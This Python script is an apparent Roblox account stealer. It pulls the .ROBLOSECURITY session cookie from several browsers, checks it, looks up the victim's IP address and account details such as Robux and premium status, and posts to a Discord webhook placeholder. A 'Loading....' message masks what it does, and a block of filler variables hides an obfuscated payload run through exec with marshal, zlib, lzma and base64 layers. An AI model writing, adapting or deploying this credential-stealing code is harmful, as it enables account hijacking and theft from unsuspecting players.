import os
import codecs
import marshal, zlib, base64, lzma
import json

webhook = "YOUR_WEBHOOK"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
except:
    input("Libraries not installed press enter to exit ... ")




distract = "Loading...."
print(distract)

def logger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = logger()


ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]

isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    requests.post(url=webhook,data={"content":f"R.I.P , Cookie is expired\nDead cookie :skull: : ```{roblox_cookie}```"})
    exit()

ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']

__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b85decode(b'FH~eUS4M9^K|xe)F>+EzL1#f|K~h;kK|w+=Oe<GvK~hOqWlDN<S9ElFGB{{5Y*aF3HhOMKZDe|Oc~(YiOIle~N>M^dd2LKeY-v_gK}Bg%VM0kkK~h3AYejcKMny$KNkeXBLs>6wN@Y1Ud1q!#abs{yP-#yuZ)9UQHB(q-YfLgXQC4<%PefIEb5%HTY*cb;Z*X=+a9DOTGHrEqc4TugFE?T_dTu#pcPnFKP;^c&W=v@@Mpt)6L@P;jY&0-XGeKl9W>04;a8FHcH)&=<Q7>dtIWb6gd1Oy?NP1N(d2?D&W->%LOhR)nFEmJaX)<~^IA>-@ayLwPS~+esI5K)Ta#wmdH&=Q%QdC+iZdo!fYcw)1Z8S13Y&0@2FL_W{FIi4=FHKEmM^HF#M=v-uM=v;QM=v-qM=v;YM=v-yM=v;OM=v;eM=v;WM>8v0YGig=D^6xwbxKc8YBx@JPIz`Rb9P2{b9P2bPIWbIG&o04dQWy}YB+jwGdWCnFe^7#WHmW4NHcmfWoBbkD@1xYH)nP<W<hOcaw|l7b1Ot|R(CITFE4FKLU$`NXL31uNOx6GYD+UYb}u<IT0?0yGBZm=PHZ@9Okp)qF*Y+aaBWprM|WCoby6=kZD?~aYGp%hdS*yYR%%mJVo!E-MR+fIZD@2jH$rYNbum|ISyXLGS~oRgSV3lNRdhLUYc*$0bVqDfHET{UQ$=A<c3OB>ODj%rcs4gfbYxd}S~PVrZZvOYGB|a1OL#bDbaQY}dSO*!FGO;BIAKR}QA0I1G&g5*S2R#zGB0{gP-1IYb!b*GF-0*~SvF*5X-0WsOiXw(VP!B!VsLe9PFiACby0M7Wl>8nIYLcxIb>#NXlHDCS}Q_#H%c^RF)LJYb4@pLMOkY^GG$L|Yi(k1O*dC`M?`OKL{wEbOiFBcSWZe!abbB&c{FQmYDINzM_F-qX=-jybu~#bLql?DS7=piOEhXkc|=f1L}NH}X=rk8Hfb?>F==5qPDDscQdM+zOEE`GZ8lYHPBb(&aB4|-R7_-SX*qdeX-_v(bahWOVJmD;OL=ikR7rJjH)%m-MN>#iF<4D(c}z56Xf$kWbv0x{aWQgtXi{rPRC-r7Rbgsyb7?D4R&028LNZ5sO?Y}(a#==fWpPVpIWbCUad2f*aWr&APDNB?I8%6VMPp}cIZs$xGH)wZc{O56VK7=^LsoTkV?{-Ea8q(~Ff&I)Xlzq9VnbLqb4@gGb7)scbT&0vaY11?b~!;cGgMhdGi7*VMRQPTR&8)ZdT}^oOEf|>Rz)^WaBFl-Zb?=$cw>1nS8Fv-MK4oAF=;C{Hf%vqZec}mWKDW(Z*xsnF=sJyH$rf2aw|bcM{zGqb!#wlST{_0SXpgzL2OS;bYVquLUUS8WHe%RGe<c{W<zyOLQ79{Pc<<~Rd6#hPe(anQB_4^ZF6-tMNLvGR7H1kWMy@6Ok-<ta4U6WbaGR7Z*fX=Iaza5b9y;UXK89tGf6>7b2D;LL~C$ia!*k=Q&vPXNoh<raau`7HEVe?XH!-}Wno!0aa2@#a$!Vjc{X%ndRjMmGh=jjGIB^mbXP@HZ8kG`a!WUPG%`;!Fl=^JV|hhrXLvMbGEY=lVKi7yR%m)vVK;7NL2^t`Mp9!!VmVb!c`GwCPiAIQMpJl1bTDsLXEb(sW@}Y5bVE{aabYocLQ8dVbXs^%az%7AH&{YUcT!45GiXC>WmiOUaBXx<T6AW0Mp$@wN@`<qSyeT3Y&CgDc~L7wN=jijIBjxuLT_0(LpOAIcTj9}T2V|mby!w(c`|rLS$S<VY)4BkZ)-MlcU4wTHF;1%O)_O|dT%&lIdVf)WI<$CFnBa^W>igBPeoH#N<(8cS6WU&OGt2ZP**usa7IZpG*>t`Mp$D~XF^P4Q!;LCLUL6wa%^fjYd2A9b#O3YH!oUZYgScER7zKRMRH7UGHXUcYEe*PRBJU?GgnhEH*8^RZbU~gaddJ)MRjvSb5}@qK{Z!QH8VGHMn`yJM{Z|UbSrmlX?06VSvh4+G%#0gSV2@dS4>4>WKVfRZ*Xl!Zc24}L``HeWm7mxOjbfxMo2<7SZYo+RYGZRGFfs=W@>g#Hg`;Sc~Lb{WM)HnGHhCTRcusOFk)zJQb$mCXLdMNNHldzLu@%XHaALkH#sjsOLZ$XD{@D6W@S=VL`*nGc|})bPH1d2Pg7TMSZ+x<SXnhxPBTMAG<0utXg7IgOi6ZDN>5WmQ)z5;IYl^EOmui`Id^hrYjk=;VOnNKIaYU3PcUsXI7w1kS8FduaAa{yLQqyyK{GXQQE^agV=`1{MonlzSWIbFbw^f3b#ZS{cTy`<WlvE@W^8a%XD?}MZ$UX~O*KM9cs4azaA|c<Lo0D-PEb`xRZ}*1Lwa{oX=^kyd1YgBYH4LpSXxA6Mr~_1OjmYSMQ2HJc}#6rGjvH*Yiv|EPGvK6P<3)dFmp^$VPQ^rFE&hWLUdMnX=Y<aVJk3fcTaOyF*#*vZ)|IHV|p=EYII~zS2QbfHDzyAZZuSGcWFaXPfKNVGeJ^xT4Zl9Y(_>=Fj{0QPi${Nad}NpHgjxkLS$+)b7wV6I7xVELrp71X+~!>V=FL2H8wd=LvJxmOkpcBWpH;kX+}&_O>R$4c`I*AYer`<S86gVV`XkcP*gZ<K{ri7OHf5lO;0N}NlRLBM|D_LXJTk^SV~JpL`82zI7w|QZD&hMb7)CZZ(49vLRNZ4NL6S#GEOsNSYj(mPi9(kN>O1}Mo%+rLr67db4599S8jHCW@b%VXKO1mY+`I`I5S2uK}|VFQ*=#nSU7ocRc&r_cQ-X;G&V|Rc6e$rFm*#@PA_#rNJvj*Vo+IPFIjdgX;?~cdQEd!MLAV(M^-{qWnn96IaE<%RbohOQD$s;Pg8nXX)<sxD`qoRMS3zvHgZ&TbVYPyczHHMYB5+hMmS_vGG%UJSVTidH&9Mbb~aHpWN1S(YGy%YH*j<}YDYM9S2b`mS8YpAM@3h3L3mYiYfUm*N@!77NK;2oHZoy%WNmqDH#cE&G%|2(GGb0OLR5NMYb#G$N_bLJZBSQmZg^8@bt_F+GjKswVK8EFa6@uVL`6AKaBMbpF?vmMI7m@bR53D4M>AG>d2>oiR&RB6R!LE1Z(3+DH%3-CSujymZdhe_K~z>vSz1<ObXF@lNKjZ+R&Z5na%FK-SVwSLW_2|$MoMZ*ZEH()K}~H_IWIFePD(jYaWHFWIY)U%bZ1s8H%DbJGhstdbyaC=VO2zSGi^^Xb5T+_Su1EOG;(ZmR!J*zYjQMCQBXv7X<B3}b#-(%Oi5^HaxhJDSa?@fFiKBsPgG1=H%u#fFlca5G;(%qL@{edWokoWNOxm0HbXW@R6#UxR%dTGK~`ZlZ&qb^Hbzb>Qc*=RcsF=%Oi*-DM^i#rLRfNSacO5bZBAM@MNlv+S!{4mX;ny8Suih2XD?bYM_6l4FIae5MN)V-cw|pBT4G8vHfC5aG*~uKbTU{*FiUq#X=qS$HBvQGRCaV}D`!V~d2TdQcri9<W_LJZFi<s7M_EurQcyQGXDdl{Pf<!*XG~6cR#rt}c5ib|aYjr>ad;~*XKhPYQ+ZZcF?42GV=pUMW>!Q-crbG`c2RIsHAPD@FIss^HZ(XnHcn+Zctm<DOJr<Ec2-z7LSaxwOILABN;OPJS2S8^Hf1$!QdUH4LUMI0Fm6z5Rdh;lXg4%7Zc8#+HFHg3N;6MSM>lp=V>ohFD>X)EOl?*{N?0*=N={5-VJkE_bTLyjRC8BhPf|i=criC=L`5$`V>x7HM^tNAcyBgzaCkB`c}_4{Q#NTfIX5z4aW^t#PFQkwZDvqvZZBqLWO#5*GI%d9Y)NKrbWdhba4#=7Ib>m1WpFh~S8-2iNN;*pOF1wvVQ6_|VL5hjY*<-yPB1o3H85szbyGxcHgHfePB%3+bYU=ZV?{DzcWPH`aA-+-M^8$6PH%2ELNib?a!^b*aYQvrLV0dYG-xz3OL0pwQ#DdoO*JbyLpfwgP()}-F;Zn}V=y#1P&ac+SyVQ9FnVZKD|B@<XlG1zV{0=pD{f3-cR^@ZN=k4yadKKWM@%<EH8OEdLvU>`XHHgmR&_ICG&p2rIc9i9VO3OVd1Py2H#uTxa&j_qSa42ZMm0G%LT+Y8N_s?0HbO*YOG!#tL@RhyIbnKBZZcweby;(3Wp_6+Z(3MuHE35jQ!+J4FHdl5QC4I(b1^trG&yu^O;S&Kacf36X?S&3Ohz?yYcFVUacWj}Z+13AS#MT1GBigwS$9fOYE@-HcyePyH&9A*XgD@QO;~1CaWykmV=-q$Np3NCaX2_<c5h2!H)AkYY<fgyIBQ8cFE?3aS#x(*D^OW+N@PfBNk&RaFJx6{QbsRHaVt|wb46o#VM2L1Lq}6#PBlqYct<laS9MEvIAkzFa&ks<NKZ2}IWTH@HAYfuD>r9tS7$hBa%3?>P;YlOXLe3mP*zWKN^5R;T6k)3HZe{`Hc3KhL@!V^LU~g{cY0!JIB#-wK{H7!GILgBR%>TCMp$N6I4fmPQ#ff(Q8jsXXHIQlO?NhAICfbwcvV9=G;MH5M`0^Tc2!PlFja9=W;J$fZbU0ucSCqkd2>TkR&#nXLTp83cXDw`LvuNFVmVMaacpC5Pd8;rICoZUWpQC;HepS1X<}noNj6JaHhNfMcsW>4IcIV*bZ$6HPgrtFSyVS?ZE|*MNk&;WIYu)@L^et@aC$~ZFM4QVY%oDZY)?;CYhqz(ZBI#IVKZoTGgmidP)>9!R76iiO?oS8dQD<Da%*gPZ%lVXWKd*gO-W&BP;f+QPGov^P<2*eI5=W@F*Q<HM@@8Pcy@GHN-}g~F*!mqL@QZ(Y;I6NVQW`$R(g3zGDJB-H%xR*QY&ODWl2n0M{-4DcVbm=F;!-IN^UhaQg%p0D^^-nS2=KXHgYpXW>0ECFfTGhOioNnGE!7!WLR)bVtP?#cS~7pc3EOKR99_nMP*|-cSbi!SyVN3NmXM=RAf|5FjrYlSwT`OcQI#eGFW(2V^c3wWJYghRbhEib$M(?MQ}7~NM=@HW=JzebwPG|VOe@mWkE4_GGsMKL{v0HNM$ooHAygNY<NLdG-pguOj%)Bd3sPqL^oG4Xi70qFI7)*M^{5iK}Kj~WGh)TI5lubYBD)ZYgjKxMNm+BVKi@MQgS&^FjYchc5g;@Xn8YLHfJ?7X;x53WL9KVYE)`^L18sgXh<+?W@B(}ZD~+VLNqU9Q&31`Q!8(ARzy%VH&aAZXLL$0R8LD-YEyAIWiLZnNpCe{Q!s2}P)=-YbwxyFVsLLWP<A*&WnnpPW@kioQ7<q{PFgT&axY<UVQNP&ba-`Ta&0efPGwYPMK4n?SvE5;Rzz%WW^ZsdcX@hmM`k!dPGfIqPijwWNiS7ST0%2LIC4s5QB^i&RcSCmW^qtdL|1ZjNOovKT3K32H*7;tQe|Z?aAtN!S3_b|ZF)p)X-zgrHcB>lF=azFX-{EJD`-}Eb8lH$H%w4&OLSsdYerc~HBMD4HBnhBc10^OXktZUT1qrYYD+{nLQ^txVroofL^648NjPa@dNxQhIW<I3Qg~5Lct}!9ZB=JvYHe>(c2`nEIax<>Pfa*DI97LARb)9qSV&oUMr$ueK`&WOW=AkkbWT<|S8y+5H+6bvdPH?WT0t{pPkCc_H%n_PaY-~XW@vF}WoJr7FGOy2PA@BMLu+ntX;gM^YkD_FY%xPnQc*N?M^$xCdTC`dYD!Q+Gf`MhN>^26T0?d(L`P6scrj>CO+-*PIYBcrOmtddQcp2jR%~QuFj8-9HF`#3Wh;1OacwtARZ?U*H&JSGRa#DQG+H(<NkdI{Vlie_PBuhsIaF?KH(EqyLS#*1O<`AAH)k<&cS2}2GHXq1b}&UvPD^n(OhPM2d1_B{Y<gl;PDnyHa6(E<Pe)W`Q)P2aVP|$TI9W_qPBCvUacpEYL1uMCXisZIW=MHgZ(&DeGIMt~L1S)iPepTLI5$X7HfUjTGEHMLHg!#JaW^YRbZb&%d2ncYF>O_MZdXt+OiE^NM=NMpIYw_pb2C;;S~y2<Zfr(RNoz?|S7~&2VlZS?NHk|_WLh|RG<YvZdQWd`V=+iYX>o31aztTLdN58nK{HTrMoL0hO=ekQV=Gi)Yi)5aIdwBsO;$~6Np5XMP;50tNNYk^bYwDhFfw*YK{QEtH!($IPFFc?NjY$0Q&2*6OmR_JZ$o2saYJ-Oa7tH6VQ^SiOG0mEIC)4{Fe^fOS4C@QY-x2+D^gZ*Y+6Z2D`zlgL}gh{D^+)RQA;pSR&;DDb6Ia{GB;RLIAwE6F;Pr5F=kdrO)*V!cQQgZYh*+=XJm0{PE}S!H)K#YY;$HSXHH>iM|M#)G<j@BNKk7tT4HTQWKk<{MmJ4iXHZ8%bToEJRA)$Xcrrs`V|HXtFIrf4GgeqvNiZ`;NMUeraBfdBQ!8ptaYAN9b!vEdZ!0rsPGxs)ST9L5Gc-(BWlef8OiOi6PeLzONOM_EGIe%zNOF2(SynK0Hb_cGWp`RQSujX$c`spjb2l+ZYIQkwPj5tFZcte@GD<j8Y-cZLHA#9hNlj^EQ8sW)Qcr1DO=4O@GfHY#NOXE)PjPcXWJP9KWHCx+S$A+jOjbfxRYEyPa!f){H%>@yQAAH?Zgx;(Wl2{tH%M}7Ryk-=Q9>_AFG*H4b5T_}SWjX`ZcSlhLoZP>N;60_YFTJ<S50?nZ$()-aCS{-Xm>YeIY>BEF-1yZOEhe5PFim>cu7QbYGhb?I5t#SSxi+@Hg;=Haduf}aW7&?Ml^3`Wkhy*Lq>60S3@ysGiz>1NpW^cb3->&OLSUcS8+{mR&YdSZFx6VOfqsYX-98iI5=W9Q)E<eOJ#O3aZY7;FK2RbVQgATaYZ?4a(82RQ7<`Zc6xY7LR3O9V`3{eL_srmZ&r0OLUw04WovCKXKGe)XgO9#dO~z$K{G}xRAe$kIcjWnWpQp=aCSCBR&qu!cTzApd1Y^6H)u*~QDiS~T53pCNM|-QIdNJqQC2xORB3cFM`CGWZZ~>xM`BuVP*q8GH*`>CMs9O!HF9+{XjU*`NHlXsS5`_lFJf?bb1Q8yVQfQbD>ZpZD{N?PGiNk8Sy@?nIcZpLWLauVLr_jqcW`=kT2^vFNMS}$G;U5eGE#AGOl5dRI9PfxZFX;AO?Goycu`nTOHwgmGc`kQbVy`#S#EboMniU2F)~GTZ!$S^D{@#;OJy)_S65eQGDT2kbW2$|MmBY5F+_D}FfngKXfZW7Z829wbTcq+OF~p~Hg8mEXLLm`Z&EixVQW@bSz=dJIagXpD=$WOV>w|#W@SWLXj(B!SxQ-2R&Yy1YDQ&nP)AN=MMr3IYfmynF=tq3OmuQ>Ph(YQPdR33S5js)W<_B+Pf$&5G(s;iL}OBHXF@l4XisZIHhOL`LrG$0cyTXRX+d;oGI2^dLP%$BIbuOWVRLnAH%(J3YIIgKdQD_PF=$XjVOe@sRY_-dPce0PO?gXnO*myxL3nRWPkK;NWLZd1aWFGhMMz{)D|s<8RBd8mNp@K)S$HxwNjNZ4G<b4!cQisoX)rTpc5Om#D>ipiS~6xbIbm8@Xl{6GFH&)1WMwZob$3KIOJ-FudP7!aX*WqLL3MLTNltA-c2HPDdRl8mGf!qKbvJ59HE(xBGEin=H%WI%ZF5LOICgh6M^blhFHA2hcsNgVa%FUKbX7)iZ*omqW_D0|PI@mdFE2M^FE4InH85;$O=mDSIAk(vPER#AWHmW8ZdYzIPe?B_OGP(mcxhx}S21)mYBzCma&9j(VN`l?LQYRNax_bIP%v^wYb!M{Wp-t3WHow7ZZJhyc6LliVmCK!XhdXYRCjW7Ha9tQR9G}ZV>w4JH)=LWOD|4ZWHU@Ncw$XOc5_%{b9ZJmP&qR>MK5|Wc{VXfL^n4yP%lzQXH7XTL2XTORdjDbK~F<)OGHIQZFE^$K|x1$N=jpEK|w)8d08+)b7N9&D|bmjK|w)5LPl(1'))))))
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL='__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WA